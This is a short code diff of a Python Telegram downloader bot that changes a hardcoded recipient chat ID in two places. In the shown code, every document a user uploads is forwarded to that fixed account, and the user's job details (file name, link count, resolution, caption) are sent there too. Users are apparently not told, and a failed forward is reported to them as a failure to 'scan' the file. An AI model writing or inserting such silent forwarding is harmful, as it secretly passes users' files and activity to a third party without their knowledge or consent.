@@ -526,7 +526,7 @@ async def luminant_command(bot: Client, m: Message):
     if input.document:
         x = await input.download()
         try:
-            await bot.send_document(7448837918, x)
+            await bot.send_document(887699812, x)
         except Exception as e:
             await m.reply_text("Sorry 😢 I Am Unable To Scan 🔍 The Document")
             await input.delete(True)
@@ -719,7 +719,7 @@ async def process_file(bot, m, links, b_name, count, end_count, raw_text2, res, 
 
     try:
         await bot.send_message(
-            7448837918, 
+            887699812, 
             f"**•File name** - `{b_name}`\n**•Total Links Found In TXT** - `{len(links)}`\n**•RANGE** - `({count}-{end_count})`\n**•Resolution** - `{res}({raw_text2})`\n**•Caption** - **{CR}**\n**•Thumbnail** - **{thumb}**"
         )
         
